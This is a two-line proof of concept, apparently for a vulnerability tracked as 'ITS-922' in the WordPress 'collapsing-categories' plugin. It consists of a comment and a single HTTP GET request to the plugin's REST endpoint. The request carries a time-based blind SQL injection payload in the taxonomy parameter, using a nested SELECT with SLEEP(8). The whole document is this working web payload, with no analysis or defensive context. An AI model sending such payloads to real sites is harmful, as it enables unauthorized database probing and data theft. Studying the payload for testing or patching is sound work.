# Vulnerable: ITS-922
GET /wp-json/collapsing-categories/v1/get?showPosts=1&taxonomy=category%27%29+AND+(SELECT+1+FROM+(SELECT(SLEEP(8)))a)--+-
